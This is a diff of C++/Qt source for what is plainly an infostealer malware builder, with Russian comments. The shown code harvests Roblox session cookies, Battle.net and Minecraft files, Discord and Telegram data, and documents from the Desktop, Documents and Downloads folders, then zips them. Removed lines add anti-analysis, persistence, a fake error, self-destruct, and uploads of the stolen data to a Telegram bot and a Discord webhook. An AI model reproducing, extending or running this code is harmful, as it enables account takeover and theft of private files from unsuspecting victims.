-            std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
-            file.close();
+                std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+                file.close();
+                result += "Roblox File (" + entry.path().filename().string() + "):\n" + content + "\n";
 
-            std::regex cookieRegex("\\.ROBLOSECURITY=([^;]+)");
-            std::smatch match;
-            std::string::const_iterator searchStart(content.cbegin());
-            while (std::regex_search(searchStart, content.cend(), match, cookieRegex)) {
-                result += "Roblox Cookie: " + match[1].str() + "\n";
-                searchStart = match.suffix().first;
+                std::string destPath = dir + "\\Roblox_" + entry.path().filename().string();
+                std::filesystem::copy_file(entry.path(), destPath, std::filesystem::copy_options::overwrite_existing);
+                collectedFiles.push_back(destPath);
+                Log(QString::fromStdString("Roblox file copied: " + entry.path().string()));
             }
         }
 
-        // Захват WebSocket сессий Roblox
-        std::string wsData = CaptureWebSocketSessions("RobloxPlayerBeta.exe");
-        if (!wsData.empty()) {
-            result += wsData + "\n";
+        // Поиск Roblox Studio cookie
+        std::string cookiePath = localAppData + "\\Roblox\\LocalStorage\\";
+        if (std::filesystem::exists(cookiePath)) {
+            for (const auto& entry : std::filesystem::directory_iterator(cookiePath)) {
+                if (entry.path().extension() == ".roblox.com") {
+                    std::ifstream file(entry.path());
+                    if (file.is_open()) {
+                        std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+                        file.close();
+                        std::regex cookieRegex("ROBLOSECURITY=[^;]+");
+                        std::smatch match;
+                        if (std::regex_search(content, match, cookieRegex)) {
+                            result += "Roblox Cookie: " + match[0].str() + "\n";
+                        }
+                    }
+                }
+            }
         }
-
-        // Сохранение данных Roblox
-        std::string robloxDest = dir + "\\Roblox_Data";
-        std::filesystem::create_directory(robloxDest);
-        std::filesystem::copy(robloxPath, robloxDest, std::filesystem::copy_options::recursive);
-        result += "Roblox Data Copied to: " + robloxDest + "\n";
-        Log(QString::fromStdString("Roblox data copied to: " + robloxDest));
     } catch (const std::exception& e) {
         Log(QString::fromStdString("Error in StealRobloxData: " + std::string(e.what())));
     }
@@ -1814,8 +2179,8 @@ std::string MainWindow::StealBattleNetData(const std::string& dir) {
 
     try {
         for (const auto& entry : std::filesystem::recursive_directory_iterator(battlenetPath)) {
-            if (entry.path().filename().string().find("cookies") != std::string::npos) {
-                std::ifstream file(entry.path(), std::ios::binary);
+            if (entry.path().extension() == ".config" || entry.path().filename().string().find("Battle.net") != std::string::npos) {
+                std::ifstream file(entry.path());
                 if (!file.is_open()) {
                     Log(QString::fromStdString("Failed to open Battle.net file: " + entry.path().string()));
                     continue;
@@ -1823,23 +2188,14 @@ std::string MainWindow::StealBattleNetData(const std::string& dir) {
 
                 std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                 file.close();
+                result += "Battle.net File (" + entry.path().filename().string() + "):\n" + content + "\n";
 
-                std::regex tokenRegex("[a-zA-Z0-9]{32}");
-                std::smatch match;
-                std::string::const_iterator searchStart(content.cbegin());
-                while (std::regex_search(searchStart, content.cend(), match, tokenRegex)) {
-                    result += "Battle.net Token: " + match[0].str() + "\n";
-                    searchStart = match.suffix().first;
-                }
+                std::string destPath = dir + "\\BattleNet_" + entry.path().filename().string();
+                std::filesystem::copy_file(entry.path(), destPath, std::filesystem::copy_options::overwrite_existing);
+                collectedFiles.push_back(destPath);
+                Log(QString::fromStdString("Battle.net file copied: " + entry.path().string()));
             }
         }
-
-        // Копирование данных Battle.net
-        std::string battlenetDest = dir + "\\BattleNet_Data";
-        std::filesystem::create_directory(battlenetDest);
-        std::filesystem::copy(battlenetPath, battlenetDest, std::filesystem::copy_options::recursive);
-        result += "Battle.net Data Copied to: " + battlenetDest + "\n";
-        Log(QString::fromStdString("Battle.net data copied to: " + battlenetDest));
     } catch (const std::exception& e) {
         Log(QString::fromStdString("Error in StealBattleNetData: " + std::string(e.what())));
     }
@@ -1867,23 +2223,25 @@ std::string MainWindow::StealMinecraftData(const std::string& dir) {
     }
 
     try {
-        std::string launcherProfiles = minecraftPath + "launcher_profiles.json";
-        if (std::filesystem::exists(launcherProfiles)) {
-            std::ifstream file(launcherProfiles);
-            if (file.is_open()) {
-                std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
-                file.close();
-                result += "Minecraft Launcher Profiles: \n" + content + "\n";
-            } else {
-                Log(QString("Failed to open Minecraft launcher_profiles.json"));
+        std::vector<std::string> mcFiles = {"launcher_profiles.json", "usercache.json"};
+        for (const auto& file : mcFiles) {
+            std::string filePath = minecraftPath + file;
+            if (std::filesystem::exists(filePath)) {
+                std::ifstream inFile(filePath);
+                if (inFile.is_open()) {
+                    std::string content((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
+                    inFile.close();
+                    result += "Minecraft File (" + file + "):\n" + content + "\n";
+
+                    std::string destPath = dir + "\\Minecraft_" + file;
+                    std::filesystem::copy_file(filePath, destPath, std::filesystem::copy_options::overwrite_existing);
+                    collectedFiles.push_back(destPath);
+                    Log(QString::fromStdString("Minecraft file copied: " + filePath));
+                } else {
+                    Log(QString::fromStdString("Failed to open Minecraft file: " + filePath));
+                }
             }
         }
-
-        std::string minecraftDest = dir + "\\Minecraft_Data";
-        std::filesystem::create_directory(minecraftDest);
-        std::filesystem::copy(minecraftPath, minecraftDest, std::filesystem::copy_options::recursive);
-        result += "Minecraft Data Copied to: " + minecraftDest + "\n";
-        Log(QString::fromStdString("Minecraft data copied to: " + minecraftDest));
     } catch (const std::exception& e) {
         Log(QString::fromStdString("Error in StealMinecraftData: " + std::string(e.what())));
     }
@@ -1891,504 +2249,102 @@ std::string MainWindow::StealMinecraftData(const std::string& dir) {
     return result;
 }
 
-std::string MainWindow::StealChatHistory(const std::string& dir) {
-    if (!config.chatHistory) return "";
+std::vector<std::string> MainWindow::GrabFiles(const std::string& dir) {
+    std::vector<std::string> grabbedFiles;
+    if (!config.fileGrabber) return grabbedFiles;
 
-    std::string result;
-    char* appDataPath = nullptr;
-    size_t len;
-    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
-        Log(QString("Failed to get APPDATA path for chat history"));
-        return result;
-    }
-    std::string appData(appDataPath);
-    free(appDataPath);
-
-    std::vector<std::pair<std::string, std::string>> chatApps = {
-        {"Discord", appData + "\\Discord\\Local Storage\\leveldb\\"},
-        {"Telegram", appData + "\\Telegram Desktop\\tdata\\"}
+    std::vector<std::string> directories = {
+        std::string(getenv("USERPROFILE")) + "\\Desktop\\",
+        std::string(getenv("USERPROFILE")) + "\\Documents\\",
+        std::string(getenv("USERPROFILE")) + "\\Downloads\\"
     };
 
-    for (const auto& app : chatApps) {
-        if (!std::filesystem::exists(app.second)) {
-            Log(QString::fromStdString(app.first + " path not found: " + app.second));
+    std::vector<std::string> extensions = {".txt", ".doc", ".docx", ".pdf", ".jpg", ".png"};
+
+    for (const auto& directory : directories) {
+        if (!std::filesystem::exists(directory)) {
+            Log(QString::fromStdString("Directory not found for file grabbing: " + directory));
             continue;
         }
 
         try {
-            std::string appDest = dir + "\\" + app.first + "_ChatHistory";
-            std::filesystem::create_directory(appDest);
-            std::filesystem::copy(app.second, appDest, std::filesystem::copy_options::recursive);
-            result += app.first + " Chat History Copied to: " + appDest + "\n";
-            Log(QString::fromStdString(app.first + " chat history copied to: " + appDest));
-        } catch (const std::exception& e) {
-            Log(QString::fromStdString("Error in StealChatHistory for " + app.first + ": " + std::string(e.what())));
-        }
-    }
-
-    return result;
-}
-
-std::vector<std::string> MainWindow::StealFiles(const std::string& dir) {
-    std::vector<std::string> collectedFiles;
-    if (!config.stealFiles) return collectedFiles;
-
-    std::vector<std::string> targetDirs = {
-        "C:\\Users\\" + std::string(getenv("USERNAME")) + "\\Desktop\\",
-        "C:\\Users\\" + std::string(getenv("USERNAME")) + "\\Documents\\",
-        "C:\\Users\\" + std::string(getenv("USERNAME")) + "\\Downloads\\"
-    };
-
-    std::vector<std::string> targetExtensions = {".txt", ".doc", ".docx", ".pdf", ".jpg", ".png"};
-
-    for (const auto& targetDir : targetDirs) {
-        if (!std::filesystem::exists(targetDir)) {
-            Log(QString::fromStdString("Target directory not found: " + targetDir));
-            continue;
-        }
-
-        try {
-            for (const auto& entry : std::filesystem::recursive_directory_iterator(targetDir)) {
-                if (!entry.is_regular_file()) continue;
-
-                std::string ext = entry.path().extension().string();
-                if (std::find(targetExtensions.begin(), targetExtensions.end(), ext) != targetExtensions.end()) {
-                    if (entry.file_size() > 10 * 1024 * 1024) { // Пропускаем файлы больше 10 МБ
-                        Log(QString::fromStdString("Skipping large file: " + entry.path().string()));
-                        continue;
+            for (const auto& entry : std::filesystem::recursive_directory_iterator(directory)) {
+                if (entry.is_regular_file()) {
+                    auto ext = entry.path().extension().string();
+                    if (std::find(extensions.begin(), extensions.end(), ext) != extensions.end() &&
+                        entry.file_size() < 5 * 1024 * 1024) { // Ограничение размера файла 5 МБ
+                        std::string destPath = dir + "\\Grabbed_" + entry.path().filename().string();
+                        std::filesystem::copy_file(entry.path(), destPath, std::filesystem::copy_options::overwrite_existing);
+                        grabbedFiles.push_back(destPath);
+                        Log(QString::fromStdString("File grabbed: " + entry.path().string()));
                     }
-
-                    std::string destFile = dir + "\\" + entry.path().filename().string();
-                    std::filesystem::copy_file(entry.path(), destFile);
-                    collectedFiles.push_back(destFile);
-                    Log(QString::fromStdString("Collected file: " + destFile));
                 }
             }
         } catch (const std::exception& e) {
-            Log(QString::fromStdString("Error in StealFiles for " + targetDir + ": " + std::string(e.what())));
+            Log(QString::fromStdString("Error in GrabFiles: " + std::string(e.what())));
         }
     }
 
-    return collectedFiles;
+    return grabbedFiles;
 }
 
-bool CreateZipArchive(const std::string& dir, const std::string& zipPath) {
-    zip_t* zip = zip_open(zipPath.c_str(), ZIP_CREATE | ZIP_TRUNCATE, nullptr);
+// Создание ZIP архива
+std::string CreateZipArchive(const std::string& dir, const std::vector<std::string>& files) {
+    std::string zipPath = dir + "\\data_" + std::to_string(GetTickCount()) + ".zip";
+    int err = 0;
+    zip_t* zip = zip_open(zipPath.c_str(), ZIP_CREATE | ZIP_TRUNCATE, &err);
     if (!zip) {
         Log(QString::fromStdString("Failed to create ZIP archive: " + zipPath));
-        return false;
+        return "";
     }
 
-    try {
-        for (const auto& entry : std::filesystem::recursive_directory_iterator(dir)) {
-            if (entry.is_regular_file()) {
-                std::string relativePath = std::filesystem::relative(entry.path(), dir).string();
-                std::replace(relativePath.begin(), relativePath.end(), '\\', '/');
-
-                std::ifstream file(entry.path(), std::ios::binary);
-                if (!file.is_open()) {
-                    Log(QString::fromStdString("Failed to open file for ZIP: " + entry.path().string()));
-                    continue;
-                }
-
-                std::vector<char> content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
-                file.close();
-
-                zip_source_t* source = zip_source_buffer(zip, content.data(), content.size(), 0);
-                if (!source) {
-                    Log(QString::fromStdString("Failed to create ZIP source for: " + entry.path().string()));
-                    continue;
-                }
-
-                if (zip_file_add(zip, relativePath.c_str(), source, ZIP_FL_OVERWRITE) < 0) {
-                    zip_source_free(source);
-                    Log(QString::fromStdString("Failed to add file to ZIP: " + relativePath));
-                    continue;
-                }
-            }
-        }
-
-        if (zip_close(zip) != 0) {
-            Log(QString::fromStdString("Failed to close ZIP archive: " + zipPath));
-            return false;
-        }
-
-        Log(QString::fromStdString("Created ZIP archive: " + zipPath));
-        return true;
-    } catch (const std::exception& e) {
-        zip_discard(zip);
-        Log(QString::fromStdString("Error in CreateZipArchive: " + std::string(e.what()) + " - " + zipPath));
-        return false;
-    }
-}
-
-void MainWindow::StealAndSendData(const std::string& dir) {
-    if (AntiAnalysis()) {
-        SelfDestruct();
-        return;
-    }
-
-    Stealth();
-    Persist();
-    FakeError();
-
-    collectedData.clear();
-    collectedFiles.clear();
-
-    // Сбор данных
-    if (config.systemInfo) {
-        std::string sysInfo = GetCustomSystemInfo();
-        if (!sysInfo.empty()) {
-            collectedData += "[System Info]\n" + sysInfo + "\n";
-        }
-    }
-
-    if (config.screenshot) {
-        std::string screenshotPath = TakeScreenshot(dir);
-        if (!screenshotPath.empty()) {
-            collectedFiles.push_back(screenshotPath);
-        }
-    }
-
-    if (config.cookies || config.passwords) {
-        std::string browserData = stealBrowserData(dir);
-        if (!browserData.empty()) {
-            collectedData += "[Browser Data]\n" + browserData + "\n";
-        }
-    }
-
-    if (config.discord) {
-        std::string discordTokens = StealDiscordTokens(dir);
-        if (!discordTokens.empty()) {
-            collectedData += "[Discord Tokens]\n" + discordTokens + "\n";
-        }
-    }
-
-    if (config.telegram) {
-        std::string telegramData = StealTelegramData(dir);
-        if (!telegramData.empty()) {
-            collectedData += "[Telegram Data]\n" + telegramData + "\n";
-        }
-    }
-
-    if (config.steam || config.steamMAFile) {
-        std::string steamData = StealSteamData(dir);
-        if (!steamData.empty()) {
-            collectedData += "[Steam Data]\n" + steamData + "\n";
-        }
-    }
-
-    if (config.epic) {
-        std::string epicData = StealEpicGamesData(dir);
-        if (!epicData.empty()) {
-            collectedData += "[Epic Games Data]\n" + epicData + "\n";
-        }
-    }
-
-    if (config.roblox) {
-        std::string robloxData = StealRobloxData(dir);
-        if (!robloxData.empty()) {
-            collectedData += "[Roblox Data]\n" + robloxData + "\n";
-        }
-    }
-
-    if (config.battlenet) {
-        std::string battlenetData = StealBattleNetData(dir);
-        if (!battlenetData.empty()) {
-            collectedData += "[Battle.net Data]\n" + battlenetData + "\n";
-        }
-    }
-
-    if (config.minecraft) {
-        std::string minecraftData = StealMinecraftData(dir);
-        if (!minecraftData.empty()) {
-            collectedData += "[Minecraft Data]\n" + minecraftData + "\n";
-        }
-    }
-
-    if (config.chatHistory) {
-        std::string chatHistory = StealChatHistory(dir);
-        if (!chatHistory.empty()) {
-            collectedData += "[Chat History]\n" + chatHistory + "\n";
-        }
-    }
-
-    if (config.stealFiles) {
-        auto files = StealFiles(dir);
-        collectedFiles.insert(collectedFiles.end(), files.begin(), files.end());
-    }
-
-    // Сохранение текстовых данных в файл
-    if (!collectedData.empty()) {
-        std::string dataFile = dir + "\\collected_data.txt";
-        std::ofstream outFile(dataFile);
-        if (outFile.is_open()) {
-            outFile << collectedData;
-            outFile.close();
-            collectedFiles.push_back(dataFile);
-            Log(QString::fromStdString("Saved collected data to: " + dataFile));
-        } else {
-            Log(QString::fromStdString("Failed to save collected data to: " + dataFile));
-        }
-    }
-
-    // Создание ZIP архива
-    std::string zipPath = dir + "\\stolen_data.zip";
-    if (!collectedFiles.empty()) {
-        if (CreateZipArchive(dir, zipPath)) {
-            collectedFiles.clear();
-            collectedFiles.push_back(zipPath);
-        } else {
-            Log(QString("Failed to create ZIP archive, sending files separately"));
-        }
-    }
-
-    // Шифрование данных
-    std::string encryptedData;
-    if (!collectedData.empty()) {
-        try {
-            encryptedData = EncryptData(collectedData, config.encryptionKey1, config.encryptionKey2, config.encryptionSalt);
-            Log(QString("Data encrypted successfully"));
-        } catch (const std::exception& e) {
-            Log(QString::fromStdString("Failed to encrypt data: " + std::string(e.what())));
-            encryptedData = collectedData; // Отправляем нешифрованные данные в случае ошибки
-        }
-    }
-
-    // Отправка данных
-    sendData(QString::fromStdString(encryptedData), collectedFiles);
-
-    // Самоуничтожение
-    SelfDestruct();
-}
-
-void MainWindow::sendDataToServer(const std::string& encryptedData, const std::vector<std::string>& files) {
-    if (encryptedData.empty() && files.empty()) {
-        Log(QString("No data to send to server"));
-        return;
-    }
-
-    // Сохранение зашифрованных данных в файл
-    if (!encryptedData.empty()) {
-        std::string dataFile = std::filesystem::temp_directory_path().string() + "\\encrypted_data.txt";
-        std::ofstream outFile(dataFile);
-        if (outFile.is_open()) {
-            outFile << encryptedData;
-            outFile.close();
-            Log(QString::fromStdString("Encrypted data saved to: " + dataFile));
-        } else {
-            Log(QString::fromStdString("Failed to save encrypted data to: " + dataFile));
-        }
-    }
-
-    // Здесь можно добавить логику отправки на сервер, если есть URL
-    Log(QString("Server sending not implemented (placeholder for HTTP POST to server)"));
-}
-
-void MainWindow::sendToTelegram(const std::string& encryptedData, const std::vector<std::string>& files) {
-    if (config.telegramBotToken.empty() || config.telegramChatId.empty()) {
-        Log(QString("Telegram bot token or chat ID not specified"));
-        return;
-    }
-
-    if (encryptedData.empty() && files.empty()) {
-        Log(QString("No data to send to Telegram"));
-        return;
-    }
-
-    // Отправка текстовых данных
-    if (!encryptedData.empty()) {
-        QString url = "https://api.telegram.org/bot" + QString::fromStdString(config.telegramBotToken) +
-                      "/sendMessage?chat_id=" + QString::fromStdString(config.telegramChatId) +
-                      "&text=" + QUrl::toPercentEncoding(QString::fromStdString(encryptedData));
-        QNetworkRequest request(QUrl(url));
-        QNetworkReply* reply = manager->get(request);
-        connect(reply, &QNetworkReply::finished, this, [reply]() {
-            if (reply->error() == QNetworkReply::NoError) {
-                Log(QString("Data sent to Telegram successfully"));
-            } else {
-                Log(QString("Failed to send data to Telegram: ") + reply->errorString());
-            }
-            reply->deleteLater();
-        });
-    }
-
-    // Отправка файлов
     for (const auto& file : files) {
-        QFile qFile(QString::fromStdString(file));
-        if (!qFile.open(QIODevice::ReadOnly)) {
-            Log(QString::fromStdString("Failed to open file for Telegram: " + file));
+        zip_source_t* source = zip_source_file(zip, file.c_str(), 0, 0);
+        if (!source) {
+            Log(QString::fromStdString("Failed to add file to ZIP: " + file));
             continue;
         }
 
-        QHttpMultiPart* multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);
-        QHttpPart filePart;
-        filePart.setHeader(QNetworkRequest::ContentDispositionHeader,
-                           QVariant("form-data; name=\"document\"; filename=\"" + QString::fromStdString(std::filesystem::path(file).filename().string()) + "\""));
-        filePart.setBodyDevice(&qFile);
-        multiPart->append(filePart);
-
-        QHttpPart chatIdPart;
-        chatIdPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"chat_id\""));
-        chatIdPart.setBody(QString::fromStdString(config.telegramChatId).toUtf8());
-        multiPart->append(chatIdPart);
-
-        QString url = "https://api.telegram.org/bot" + QString::fromStdString(config.telegramBotToken) + "/sendDocument";
-        QNetworkRequest request(QUrl(url));
-        QNetworkReply* reply = manager->post(request, multiPart);
-        multiPart->setParent(reply);
-
-        connect(reply, &QNetworkReply::finished, this, [reply, file]() {
-            if (reply->error() == QNetworkReply::NoError) {
-                Log(QString::fromStdString("File sent to Telegram: " + file));
-            } else {
-                Log(QString::fromStdString("Failed to send file to Telegram: " + file + " - " + reply->errorString().toStdString()));
-            }
-            reply->deleteLater();
-        });
-
-        qFile.close();
-    }
-}
-
-void MainWindow::sendToDiscord(const std::string& encryptedData, const std::vector<std::string>& files) {
-    if (config.discordWebhook.empty()) {
-        Log(QString("Discord webhook not specified"));
-        return;
-    }
-
-    if (encryptedData.empty() && files.empty()) {
-        Log(QString("No data to send to Discord"));
-        return;
-    }
-
-    // Отправка текстовых данных
-    if (!encryptedData.empty()) {
-        QHttpMultiPart* multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);
-        QHttpPart textPart;
-        textPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"content\""));
-        textPart.setBody(QString::fromStdString(encryptedData).toUtf8());
-        multiPart->append(textPart);
-
-        QNetworkRequest request(QUrl(QString::fromStdString(config.discordWebhook)));
-        QNetworkReply* reply = manager->post(request, multiPart);
-        multiPart->setParent(reply);
-
-        connect(reply, &QNetworkReply::finished, this, [reply]() {
-            if (reply->error() == QNetworkReply::NoError) {
-                Log(QString("Data sent to Discord successfully"));
-            } else {
-                Log(QString("Failed to send data to Discord: ") + reply->errorString());
-            }
-            reply->deleteLater();
-        });
-    }
-
-    // Отправка файлов
-    for (const auto& file : files) {
-        QFile qFile(QString::fromStdString(file));
-        if (!qFile.open(QIODevice::ReadOnly)) {
-            Log(QString::fromStdString("Failed to open file for Discord: " + file));
-            continue;
+        if (zip_file_add(zip, std::filesystem::path(file).filename().string().c_str(), source, ZIP_FL_OVERWRITE) < 0) {
+            zip_source_free(source);
+            Log(QString::fromStdString("Failed to add file to ZIP: " + file));
         }
-
-        QHttpMultiPart* multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);
-        QHttpPart filePart;
-        filePart.setHeader(QNetworkRequest::ContentDispositionHeader,
-                           QVariant("form-data; name=\"file\"; filename=\"" + QString::fromStdString(std::filesystem::path(file).filename().string()) + "\""));
-        filePart.setBodyDevice(&qFile);
-        multiPart->append(filePart);
-
-        QNetworkRequest request(QUrl(QString::fromStdString(config.discordWebhook)));
-        QNetworkReply* reply = manager->post(request, multiPart);
-        multiPart->setParent(reply);
-
-        connect(reply, &QNetworkReply::finished, this, [reply, file]() {
-            if (reply->error() == QNetworkReply::NoError) {
-                Log(QString::fromStdString("File sent to Discord: " + file));
-            } else {
-                Log(QString::fromStdString("Failed to send file to Discord: " + file + " - " + reply->errorString().toStdString()));
-            }
-            reply->deleteLater();
-        });
-
-        qFile.close();
-    }
-}
-
-void MainWindow::on_iconBrowseButton_clicked() {
-    QString fileName = QFileDialog::getOpenFileName(this, tr("Select Icon"), "", tr("Icon Files (*.ico)"));
-    if (!fileName.isEmpty()) {
-        iconPathLineEdit->setText(fileName);
-        config.iconPath = fileName.toStdString();
-        Log(QString("Icon selected: ") + fileName);
-    }
-}
-
-void MainWindow::on_buildButton_clicked() {
-    updateConfigFromUI();
-    if (config.buildMethod == "Local Build") {
-        buildExecutable();
-    } else if (config.buildMethod == "GitHub Actions") {
-        triggerGitHubActions();
-    }
-}
-
-void MainWindow::appendLog(const QString& message) {
-    textEdit->append(message);
-}
-
-void MainWindow::replyFinished() {
-    QNetworkReply* reply = qobject_cast<QNetworkReply*>(sender());
-    if (!reply) return;
-
-    if (reply->error() == QNetworkReply::NoError) {
-        QJsonDocument doc = QJsonDocument::fromJson(reply->readAll());
-        QJsonObject obj = doc.object();
-        if (obj.contains("id")) {
-            workflowRunId = obj["id"].toString();
-            Log(QString("GitHub Actions workflow triggered, run ID: ") + workflowRunId);
-            statusCheckTimer->start(30000); // Проверять статус каждые 30 секунд
-        } else {
-            Log(QString("GitHub Actions response: ") + QString(doc.toJson()));
-        }
-    } else {
-        Log(QString("Network error: ") + reply->errorString());
-    }
-    reply->deleteLater();
-}
-
-void WorkerThread::run() {
-    if (!g_mainWindow) {
-        Log(QString("MainWindow not initialized in WorkerThread"));
-        return;
     }
 
-    std::string tempDir = std::filesystem::temp_directory_path().string() + "\\worker_data_" + std::to_string(GetTickCount());
-    std::filesystem::create_directory(tempDir);
-    g_mainWindow->StealAndSendData(tempDir);
+    if (zip_close(zip) < 0) {
+        Log(QString::fromStdString("Failed to close ZIP archive: " + zipPath));
+        return "";
+    }
+
+    Log(QString::fromStdString("ZIP archive created: " + zipPath));
+    return zipPath;
 }
 
 int main(int argc, char *argv[]) {
+    // Инициализация GDI+
     Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);
 
     QApplication app(argc, argv);
+
     MainWindow w;
-    g_mainWindow = &w;
+    w.show();
 
-    if (w.AntiAnalysis()) {
-        w.SelfDestruct();
-        return 0;
-    }
+    // Запуск WorkerThread для выполнения задач в фоновом режиме
+    WorkerThread* worker = new WorkerThread(&w);
+    QThread* thread = new QThread;
+    worker->moveToThread(thread);
 
-    w.Stealth();
-    w.Persist();
-    w.FakeError();
+    QObject::connect(thread, &QThread::started, worker, &WorkerThread::run);
+    QObject::connect(worker, &WorkerThread::finished, thread, &QThread::quit);
+    QObject::connect(worker, &WorkerThread::finished, worker, &WorkerThread::deleteLater);
+    QObject::connect(thread, &QThread::finished, thread, &QThread::deleteLater);
 
-    WorkerThread worker;
-    worker.start();
-    worker.wait();
+    thread->start();
 
+    int result = app.exec();
+
+    // Очистка GDI+
     Gdiplus::GdiplusShutdown(gdiplusToken);
-    return 0;
+
+    return result;
 }
